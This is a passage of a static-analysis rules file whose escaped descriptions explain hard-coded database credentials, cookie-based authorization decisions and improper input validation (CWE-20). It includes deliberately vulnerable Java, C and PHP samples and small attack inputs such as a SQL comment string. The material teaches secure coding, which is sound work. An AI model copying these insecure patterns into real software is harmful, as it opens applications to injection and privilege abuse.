&lt;p&gt;&amp;nbsp;- If possible, configure the JDBC URL with "&lt;code&gt;integratedSecurity=true;&lt;/code&gt;" and "&lt;code&gt;authenticationScheme=JavaKerberos&lt;/code&gt;" .&lt;/p&gt;
&lt;p&gt;&amp;nbsp;- Alternatively, define the database password and JDBC connection parameters in an encrypted configuration file, e.g. a&amp;nbsp;&lt;code&gt;.properties&lt;/code&gt; file.&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&amp;nbsp;- Ideally, leverage the Java Application Server infrastructure to&amp;nbsp;protect the database password&amp;nbsp;using a specific container-provided mechanism, e.g. Oracle's &lt;code&gt;Wallet&lt;/code&gt;, WebSphere's &lt;code&gt;security.xml&lt;/code&gt; with &lt;code&gt;CustomPasswordEncryption&lt;/code&gt;, or JBoss' &lt;code&gt;SecureIdentityLoginModule&lt;/code&gt;.&lt;/p&gt;
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Source Code Examples&lt;/h2&gt;&lt;h3&gt;Java&lt;/h3&gt;&lt;h4&gt;Hard-Coded Connection String&lt;/h4&gt;&lt;pre&gt;private Connection getConnection() {
	Connection conn = null; 
  	String urlJdbc = "jdbc:sqlserver://dbServer/appDb";
  	
	conn = DriverManager.getConnection(urlJdbc, "sa", "mypass"); 

  	return conn;
}&lt;/pre&gt;&lt;h4&gt;Connection String with Integrated Authentication&lt;/h4&gt;&lt;pre&gt;private Connection getConnection() {
	Connection conn = null; 
  	String urlJdbc = "jdbc:sqlserver://dbServer/appDb;" + 
      		"integratedSecurity=true;authenticationScheme=JavaKerberos";

	conn = DriverManager.getConnection(urlJdbc); 

  	return conn;
}&lt;/pre&gt;&lt;h4&gt;Read Credentials from Encrypted Properties&lt;/h4&gt;&lt;pre&gt;private Connection getConnection() {
	Connection conn = null; 
	
  	try {
    	Properties props = new Properties(); 
      	FileInputStream fis = new FileInputStream(PROP_FILENAME);
      	props.load(fis);
      	fis.close();
    } catch (IOException e) {
      	handleErrors(e);
    }
  
  	String urlJdbc = "jdbc:sqlserver://" + props.getProperty(PROP_SERVERNAME) + "/" + props.getProperty(PROP_DBNAME);
	String username = props.getProperty(PROP_USERNAME); 
  	String password = decrypt(props.getProperty(PROP_PASSWORD));
  	
  	try {
		conn = DriverManager.getConnection(urlJdbc, username, password); 
    } catch (SQLException e) {
      	handleErrors(e);
    } 

  	return conn;
}&lt;/pre&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>MAJOR</severity><tag>checkmarx-medium</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_2096</key><name>Reliance_on_Cookies_in_a_Decision</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;h2&gt;Risk&lt;/h2&gt;&lt;h4&gt;What might happen&lt;/h4&gt;&lt;p&gt;&lt;p&gt;Cookie values are used in making a decision without validating their contents - this may allow users to tamper with these cookies thus affecting the outcome of this decision, despite not being authorized to do so. This may lead to authorization and authentication bypasses, whose exploitation may lead to&amp;nbsp;account theft,&amp;nbsp;elevation of privilege and more, depending on implementation.&lt;/p&gt;
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Cause&lt;/h2&gt;&lt;h4&gt;How does it happen&lt;/h4&gt;&lt;p&gt;&lt;p&gt;Cookie values are usually set by the server, via the Set-Cookie header, or via client-side code - thereby resulting in these values not being transparent to end-users. However, tampering with the values of these cookies is trivial, and therefore their contents should be treated as potentially malicious or tainted inputs.&lt;/p&gt;
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;General Recommendations&lt;/h2&gt;&lt;h4&gt;How to avoid it&lt;/h4&gt;&lt;p&gt;&lt;p&gt;For any session-related&amp;nbsp;decisions, never rely on user inputs alone - always validate user authority and authenticity from trusted credentials, such as a session variable, before relying on cookie values in a decision.&lt;/p&gt;
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Source Code Examples&lt;/h2&gt;&lt;h3&gt;Java&lt;/h3&gt;&lt;h4&gt;User Creation Relying on Admin Role With Role Derived From Cookies&lt;/h4&gt;&lt;pre&gt;Cookie[] cookiejar = request.getCookies();
if (cookies != null) {
	for (Cookie cookie : cookiejar) {
		if (cookie.getName().equals("role") &amp;&amp; cookie.getValue().equals("admin")) {
			addUser(username, email, password, role);
		}	
        else 
        {
            unauthorizedError();
        }
	}
}
else 
{
	unauthorizedError();
}&lt;/pre&gt;&lt;h4&gt;User Creation Relying on Admin Role With Role Derived From Session Variables&lt;/h4&gt;&lt;pre&gt;String role = request.getSession(true).getAttribute("role"); // role attribute must never be set with input from users
if (role != null) {
	if (role.equals("admin")) {
		addUser(username, email, password, role);
	}
  	else 
    {
    	unauthorizedError();
    }
}
else 
{
	unauthorizedError();
}&lt;/pre&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>MINOR</severity><tag>checkmarx-low</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_2697</key><name>Unnormalize_Input_String</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;html xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"&gt;
	&lt;link href="main.css" rel="stylesheet" type="text/css"&gt;
&lt;div id="CWEDefinition"&gt;&lt;div class="title"&gt;&lt;table cellpadding="0" cellspacing="0" border="0" width="100%"&gt;&lt;tr&gt;&lt;td valign="top" width="20px"&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;div align="center"&gt;&lt;span style="font-weight:bold;color:white;"&gt;Improper Input Validation&lt;/span&gt;&lt;/div&gt;&lt;/td&gt;&lt;td valign="top" width="20px"&gt;&lt;div class="left noprint"&gt;

&lt;span class="tool"&gt;&lt;/span&gt;

&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;div class="status"&gt;&lt;table width="100%" border="0" cellpadding="0" cellspacing="0"&gt;&lt;tr&gt;&lt;td valign="top" align="left" width="33%" nowrap=""&gt;&lt;b&gt;Weakness ID: &lt;/b&gt;20&lt;span style="font-style:italic; font-size:80%"&gt; (Weakness Class)&lt;/span&gt;&lt;/td&gt;&lt;td valign="top" align="center" nowrap=""&gt;&lt;/td&gt;&lt;td valign="top" align="right" nowrap=""&gt;&lt;b&gt;Status: &lt;/b&gt;&lt;span class="Usable"&gt;Usable&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;div id="Description"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Description&lt;/div&gt;&lt;div name="oc_20_Description" id="oc_20_Description" class="expandblock"&gt;&lt;div class="detail"&gt;
&lt;p class="subheading"&gt;Description Summary&lt;/p&gt;&lt;div class="indent"&gt;The product does not validate or incorrectly validates input
that can affect the control flow or data flow of a
program.&lt;/div&gt;
&lt;p class="subheading"&gt;Extended Description&lt;/p&gt;&lt;div class="indent"&gt;
&lt;p&gt;When software fails to validate input properly, an attacker is able to
craft the input in a form that is not expected by the rest of the
application. This will lead to parts of the system receiving unintended
input, which may result in altered control flow, arbitrary control of a
resource, or arbitrary code execution.&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Terminology Notes"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Terminology Notes&lt;/div&gt;&lt;div name="oc_20_Terminology Notes" id="oc_20_Terminology Notes" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;div id="Grouped"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;
&lt;tr&gt;&lt;td&gt;
&lt;p&gt; The "input validation" term is extremely common, but it is used in many
different ways. In some cases its usage can obscure the real underlying
weakness or otherwise hide chaining and composite relationships.&lt;/p&gt;
&lt;p&gt;Some people use "input validation" as a general term that covers many
different techniques for ensuring that input is appropriate, such as
cleansing/filtering, canonicalization, and escaping. Others use the term in
a more narrow context to simply mean "checking if an input conforms to
expectations without changing it." &lt;/p&gt;
&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Time of Introduction"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Time of Introduction&lt;/div&gt;&lt;div name="oc_20_Time of Introduction" id="oc_20_Time of Introduction" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;ul&gt;
&lt;li&gt;Architecture and Design&lt;/li&gt;
&lt;li&gt;Implementation&lt;/li&gt;
&lt;/ul&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Applicable Platforms"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Applicable Platforms&lt;/div&gt;&lt;div name="oc_20_Applicable Platforms" id="oc_20_Applicable Platforms" class="expandblock"&gt;&lt;div class="detail"&gt;
&lt;p class="subheading"&gt;Languages&lt;/p&gt;&lt;div class="indent"&gt;
&lt;p&gt;Language-independent&lt;/p&gt;
&lt;/div&gt;
&lt;p class="subheading"&gt;Platform Notes&lt;/p&gt;&lt;div class="indent"&gt;
&lt;p&gt;Input validation can be a problem in any system that handles data from an
external source.&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Modes of Introduction"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Modes of Introduction&lt;/div&gt;&lt;div name="oc_20_Modes of Introduction" id="oc_20_Modes of Introduction" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;div id="Grouped"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;
&lt;tr&gt;&lt;td&gt;
&lt;p&gt;If a programmer believes that an attacker cannot modify certain inputs,
then the programmer might not perform any input validation at all. For
example, in web applications, many programmers believe that cookies and
hidden form fields can not be modified from a web browser (CWE-472),
although they can be altered using a proxy or a custom program. In a
client-server architecture, the programmer might assume that client-side
security checks cannot be bypassed, even when a custom client could be
written that skips those checks (CWE-602).&lt;/p&gt;
&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Common Consequences"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Common Consequences&lt;/div&gt;&lt;div name="oc_20_Common Consequences" id="oc_20_Common Consequences" class="expandblock"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;Scope&lt;/th&gt;&lt;th valign="top" width="100%"&gt;Effect&lt;/th&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;div style="font-size:90%;"&gt;Availability&lt;/div&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;p&gt;An attacker could provide unexpected values and cause a program crash
or excessive consumption of resources, such as memory and CPU.&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;div style="font-size:90%;"&gt;Confidentiality&lt;/div&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;p&gt;An attacker could read confidential data if they are able to control
resource references.&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;div style="font-size:90%;"&gt;Integrity&lt;/div&gt;&lt;/td&gt;&lt;td valign="top"&gt;&lt;p&gt;An attacker could use malicious input to modify data or possibly alter
control flow in unexpected ways, including arbitrary command
execution.&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Likelihood of Exploit"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Likelihood of Exploit&lt;/div&gt;&lt;div name="oc_20_Likelihood of Exploit" id="oc_20_Likelihood of Exploit" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;p class="indent"&gt;High&lt;/p&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Detection Methods"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Detection Methods&lt;/div&gt;&lt;div name="oc_20_Detection Methods" id="oc_20_Detection Methods" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;div id="Grouped"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;
&lt;tr&gt;&lt;td valign="top"&gt;&lt;p class="subheading"&gt; Automated Static Analysis&lt;/p&gt;&lt;p&gt;Some instances of improper input validation can be detected using
automated static analysis.&lt;/p&gt;&lt;p&gt;A static analysis tool might allow the user to specify which
application-specific methods or functions perform input validation; the
tool might also have built-in knowledge of validation frameworks such as
Struts. The tool may then suppress or de-prioritize any associated
warnings. This allows the analyst to focus on areas of the software in
which input validation does not appear to be present.&lt;/p&gt;&lt;p&gt;Except in the cases described in the previous paragraph, automated
static analysis might not be able to recognize when proper input
validation is being performed, leading to false positives - i.e.,
warnings that do not have any security consequences or require any code
changes.&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top"&gt;&lt;p class="subheading"&gt; Manual Static Analysis&lt;/p&gt;&lt;p&gt;When custom input validation is required, such as when enforcing
business rules, manual analysis is necessary to ensure that the
validation is properly implemented. &lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top"&gt;&lt;p class="subheading"&gt; Fuzzing&lt;/p&gt;&lt;p&gt;Fuzzing techniques can be useful for detecting input validation
errors. When unexpected inputs are provided to the software, the
software should not crash or otherwise become unstable, and it should
generate application-controlled error messages. If exceptions or
interpreter-generated error messages occur, this indicates that the
input was not detected and handled within the application logic
itself.&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Demonstrative Examples"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Demonstrative Examples&lt;/div&gt;&lt;div name="oc_20_Demonstrative Examples" id="oc_20_Demonstrative Examples" class="expandblock"&gt;&lt;div class="detail"&gt;&lt;p class="subheading"&gt;Example 1&lt;/p&gt;&lt;p&gt;This example demonstrates a shopping interaction in which the user
is free to specify the quantity of items to be purchased and a total is
calculated.&lt;/p&gt;&lt;div class="indent Bad_Code"&gt;&lt;div id="ExampleCode" style="clear:both"&gt;&lt;div class="shadow"&gt;&lt;div class="CodeHead"&gt;&lt;div style="float:right; font-style:italic; font-size:10px; color:#98A9B7"&gt;(Bad Code)&lt;/div&gt;&lt;div class="optheading smaller"&gt;&lt;span style="font-weight:normal; font-style:italic"&gt;Example
Language: &lt;/span&gt;Java&amp;nbsp;&lt;/div&gt;&lt;/div&gt;&lt;div class="top"&gt;&lt;div style="font-size:90%;"&gt;...&lt;/div&gt;&lt;div style="font-size:90%;"&gt;public static final double price = 20.00;&lt;/div&gt;&lt;div style="font-size:90%;"&gt;int quantity = currentUser.getAttribute("quantity");&lt;/div&gt;&lt;div style="font-size:90%;"&gt;double total = price * quantity;&lt;/div&gt;&lt;div style="font-size:90%;"&gt;chargeUser(total);&lt;/div&gt;&lt;div style="font-size:90%;"&gt;...&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;p&gt;The user has no control over the price variable, however the code does
not prevent a negative value from being specified for quantity. If an
attacker were to provide a negative value, then the user would have
their account credited instead of debited.&lt;/p&gt;&lt;p class="subheading"&gt;Example 2&lt;/p&gt;&lt;p&gt;This example asks the user for a height and width of an m X n game
board with a maximum dimension of 100 squares.&lt;/p&gt;&lt;div class="indent Bad_Code"&gt;&lt;div id="ExampleCode" style="clear:both"&gt;&lt;div class="shadow"&gt;&lt;div class="CodeHead"&gt;&lt;div style="float:right; font-style:italic; font-size:10px; color:#98A9B7"&gt;(Bad Code)&lt;/div&gt;&lt;div class="optheading smaller"&gt;&lt;span style="font-weight:normal; font-style:italic"&gt;Example
Language: &lt;/span&gt;C&amp;nbsp;&lt;/div&gt;&lt;/div&gt;&lt;div class="top"&gt;&lt;div style="font-size:90%;"&gt;...&lt;/div&gt;&lt;div style="font-size:90%;"&gt;#define MAX_DIM 100&lt;/div&gt;&lt;div style="font-size:90%;"&gt;...&lt;/div&gt;&lt;div style="font-size:90%;"&gt;&lt;i&gt;/* board dimensions */&lt;/i&gt;&lt;/div&gt;&lt;div style="font-size:90%;"&gt;int m,n, error; &lt;/div&gt;&lt;div style="font-size:90%;"&gt;board_square_t *board;&lt;/div&gt;&lt;div style="font-size:90%;"&gt;printf("Please specify the board height: \n");&lt;/div&gt;&lt;div style="font-size:90%;"&gt;error = scanf("%d", &amp;amp;m);&lt;/div&gt;&lt;div style="font-size:90%;"&gt;if ( EOF == error ){&lt;/div&gt;&lt;div class="indent "&gt;
&lt;div style="font-size:90%;"&gt;die("No integer passed: Die evil hacker!\n");&lt;/div&gt;
&lt;/div&gt;&lt;div style="font-size:90%;"&gt;}&lt;/div&gt;&lt;div style="font-size:90%;"&gt;printf("Please specify the board width: \n");&lt;/div&gt;&lt;div style="font-size:90%;"&gt;error = scanf("%d", &amp;amp;n);&lt;/div&gt;&lt;div style="font-size:90%;"&gt;if ( EOF == error ){&lt;/div&gt;&lt;div class="indent "&gt;
&lt;div style="font-size:90%;"&gt;die("No integer passed: Die evil hacker!\n");&lt;/div&gt;
&lt;/div&gt;&lt;div style="font-size:90%;"&gt;}&lt;/div&gt;&lt;div style="font-size:90%;"&gt;if ( m &amp;gt; MAX_DIM || n &amp;gt; MAX_DIM ) {&lt;/div&gt;&lt;div class="indent "&gt;
&lt;div style="font-size:90%;"&gt;die("Value too large: Die evil hacker!\n");&lt;/div&gt;
&lt;/div&gt;&lt;div style="font-size:90%;"&gt;}&lt;/div&gt;&lt;div style="font-size:90%;"&gt;board = (board_square_t*) malloc( m * n *
sizeof(board_square_t));&lt;/div&gt;&lt;div style="font-size:90%;"&gt;...&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;p&gt;While this code checks to make sure the user cannot specify large,
positive integers and consume too much memory, it fails to check for
negative values supplied by the user. As a result, an attacker can
perform a resource consumption (CWE-400) attack against this program by
specifying two, large negative values that will not overflow, resulting
in a very large memory allocation (CWE-789) and possibly a system crash.
Alternatively, an attacker can provide very large negative values which
will cause an integer overflow (CWE-190) and unexpected behavior will
follow depending on how the values are treated in the remainder of the
program.&lt;/p&gt;&lt;p class="subheading"&gt;Example 3&lt;/p&gt;&lt;p&gt;The following example shows a PHP application in which the
programmer attempts to display a user's birthday and homepage.&lt;/p&gt;&lt;div class="indent Bad_Code"&gt;&lt;div id="ExampleCode" style="clear:both"&gt;&lt;div class="shadow"&gt;&lt;div class="CodeHead"&gt;&lt;div style="float:right; font-style:italic; font-size:10px; color:#98A9B7"&gt;(Bad Code)&lt;/div&gt;&lt;div class="optheading smaller"&gt;&lt;span style="font-weight:normal; font-style:italic"&gt;Example
Language: &lt;/span&gt;PHP&amp;nbsp;&lt;/div&gt;&lt;/div&gt;&lt;div class="top"&gt;&lt;div style="font-size:90%;"&gt;$birthday = $_GET['birthday'];&lt;/div&gt;&lt;div style="font-size:90%;"&gt;$homepage = $_GET['homepage'];&lt;/div&gt;&lt;div style="font-size:90%;"&gt;echo "Birthday: $birthday&amp;lt;br&amp;gt;Homepage: &amp;lt;a
href=$homepage&amp;gt;click here&amp;lt;/a&amp;gt;"&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;p&gt;The programmer intended for $birthday to be in a date format and
$homepage to be a valid URL. However, since the values are derived from
an HTTP request, if an attacker can trick a victim into clicking a
crafted URL with &amp;lt;script&amp;gt; tags providing the values for
birthday and / or homepage, then the script will run on the client's
browser when the web server echoes the content. Notice that even if the
programmer were to defend the $birthday variable by restricting input to
integers and dashes, it would still be possible for an attacker to
provide a string of the form:&lt;/p&gt;&lt;div class="indent Attack"&gt;&lt;div id="ExampleCode" style="clear:both"&gt;&lt;div class="shadow"&gt;&lt;div class="CodeHead"&gt;&lt;div style="float:right; font-style:italic; font-size:10px; color:#98A9B7"&gt;(Attack)&lt;/div&gt;&lt;div class="optheading smaller"&gt;&lt;span style="font-weight:normal; font-style:italic"&gt;&lt;/span&gt;&amp;nbsp;&lt;/div&gt;&lt;/div&gt;&lt;div class="top"&gt;&lt;div style="font-size:90%;"&gt;2009-01-09--&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;p&gt;If this data were used in a SQL statement, it would treat the
remainder of the statement as a comment. The comment could disable other
security-related logic in the statement. In this case, encoding combined
with input validation would be a more useful protection
mechanism.&lt;/p&gt;&lt;p&gt;Furthermore, an XSS (CWE-79) attack or SQL injection (CWE-89) are just
a few of the potential consequences in a failed protection mechanism of
this nature. Depending on the context of the code, CRLF Injection
(CWE-93), Argument Injection (CWE-88), or Command Injection (CWE-77) may
also be possible.&lt;/p&gt;&lt;p class="subheading"&gt;Example 4&lt;/p&gt;&lt;p&gt;This function attempts to extract a pair of numbers from a
user-supplied string.&lt;/p&gt;&lt;div class="indent Bad_Code"&gt;&lt;div id="ExampleCode" style="clear:both"&gt;&lt;div class="shadow"&gt;&lt;div class="CodeHead"&gt;&lt;div style="float:right; font-style:italic; font-size:10px; color:#98A9B7"&gt;(Bad Code)&lt;/div&gt;&lt;div class="optheading smaller"&gt;&lt;span style="font-weight:normal; font-style:italic"&gt;Example
Language: &lt;/span&gt;C&amp;nbsp;&lt;/div&gt;&lt;/div&gt;&lt;div class="top"&gt;&lt;div style="font-size:90%;"&gt;void parse_data(char *untrusted_input){&lt;/div&gt;&lt;div class="indent "&gt;
&lt;div style="font-size:90%;"&gt;int m, n, error;&lt;/div&gt;
&lt;div style="font-size:90%;"&gt;error = sscanf(untrusted_input, "%d:%d", &amp;amp;m,
&amp;amp;n);&lt;/div&gt;
&lt;div style="font-size:90%;"&gt;if ( EOF == error ){&lt;/div&gt;
&lt;div class="indent "&gt;
&lt;div style="font-size:90%;"&gt;die("Did not specify integer value. Die evil
hacker!\n");&lt;/div&gt;
&lt;/div&gt;
&lt;div style="font-size:90%;"&gt;}&lt;/div&gt;
&lt;div style="font-size:90%;"&gt;&lt;i&gt;/* proceed assuming n and m are initialized correctly
*/&lt;/i&gt;&lt;/div&gt;
&lt;/div&gt;&lt;div style="font-size:90%;"&gt;}&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;p&gt;This code attempts to extract two integer values out of a formatted,
user-supplied input. However, if an attacker were to provide an input of
the form:&lt;/p&gt;&lt;div class="indent Attack"&gt;&lt;div id="ExampleCode" style="clear:both"&gt;&lt;div class="shadow"&gt;&lt;div class="CodeHead"&gt;&lt;div style="float:right; font-style:italic; font-size:10px; color:#98A9B7"&gt;(Attack)&lt;/div&gt;&lt;div class="optheading smaller"&gt;&lt;span style="font-weight:normal; font-style:italic"&gt;&lt;/span&gt;&amp;nbsp;&lt;/div&gt;&lt;/div&gt;&lt;div class="top"&gt;&lt;div style="font-size:90%;"&gt;123:&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;p&gt;then only the m variable will be initialized. Subsequent use of n may
result in the use of an uninitialized variable (CWE-457).&lt;/p&gt;&lt;p class="subheading"&gt;Example 5&lt;/p&gt;&lt;p&gt;The following example takes a user-supplied value to allocate an
array of objects and then operates on the array.&lt;/p&gt;&lt;div class="indent Bad_Code"&gt;&lt;div id="ExampleCode" style="clear:both"&gt;&lt;div class="shadow"&gt;&lt;div class="CodeHead"&gt;&lt;div style="float:right; font-style:italic; font-size:10px; color:#98A9B7"&gt;(Bad Code)&lt;/div&gt;&lt;div class="optheading smaller"&gt;&lt;span style="font-weight:normal; font-style:italic"&gt;Example
Language: &lt;/span&gt;Java&amp;nbsp;&lt;/div&gt;&lt;/div&gt;&lt;div class="top"&gt;&lt;div style="font-size:90%;"&gt;private void buildList ( int untrustedListSize ){&lt;/div&gt;&lt;div class="indent "&gt;
&lt;div style="font-size:90%;"&gt;if ( 0 &amp;gt; untrustedListSize ){&lt;/div&gt;
&lt;div class="indent "&gt;
&lt;div style="font-size:90%;"&gt;die("Negative value supplied for list size, die evil
hacker!");&lt;/div&gt;
&lt;/div&gt;
&lt;div style="font-size:90%;"&gt;}&lt;/div&gt;
&lt;div style="font-size:90%;"&gt;Widget[] list = new Widget [ untrustedListSize ];&lt;/div&gt;
&lt;div style="font-size:90%;"&gt;list[0] = new Widget();&lt;/div&gt;
&lt;/div&gt;&lt;div style="font-size:90%;"&gt;}&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;p&gt;This example attempts to build a list from a user-specified value, and
even checks to ensure a non-negative value is supplied. If, however, a 0
value is provided, the code will build an array of size 0 and then try
to store a new Widget in the first location, causing an exception to be
thrown.&lt;/p&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id="Observed Examples"&gt;&lt;div class="heading"&gt;&lt;span id="script"&gt; &lt;/span&gt;Observed Examples&lt;/div&gt;&lt;div name="oc_20_Observed Examples" id="oc_20_Observed Examples" class="expandblock"&gt;&lt;div class="tabledetail"&gt;&lt;table width="100%" cellpadding="0" cellspacing="0" border="0" class="Detail"&gt;&lt;tr&gt;&lt;th valign="top" nowrap=""&gt;Reference&lt;/th&gt;&lt;th valign="top" width="100%"&gt;Description&lt;/th&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-5305" target="_blank"&gt;CVE-2008-5305&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;Eval injection in Perl program using an ID that
should only contain hyphens and numbers.&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-2223" target="_blank"&gt;CVE-2008-2223&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;SQL injection through an ID that was supposed to
be numeric.&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-3477" target="_blank"&gt;CVE-2008-3477&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;lack of input validation in spreadsheet program
leads to buffer overflows, integer overflows, array index errors, and memory
corruption.&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-3843" target="_blank"&gt;CVE-2008-3843&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;insufficient validation enables
XSS&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-3174" target="_blank"&gt;CVE-2008-3174&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;driver in security product allows code execution
due to insufficient validation&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-3409" target="_blank"&gt;CVE-2007-3409&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;infinite loop from DNS packet with a label that
points to itself&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-6870" target="_blank"&gt;CVE-2006-6870&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;infinite loop from DNS packet with a label that
points to itself&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-1303" target="_blank"&gt;CVE-2008-1303&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;missing parameter leads to
crash&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-5893" target="_blank"&gt;CVE-2007-5893&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;HTTP request with missing protocol version number
leads to crash&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-6658" target="_blank"&gt;CVE-2006-6658&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;request with missing parameters leads to
information leak&lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign="top" nowrap=""&gt;&lt;a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4114" target="_blank"&gt;CVE-2008-4114&lt;/a&gt;&lt;/td&gt;&lt;td valign="top"&gt;system crash with offset value that is
inconsistent with packet size&lt;/td&gt;&lt;/tr&gt;
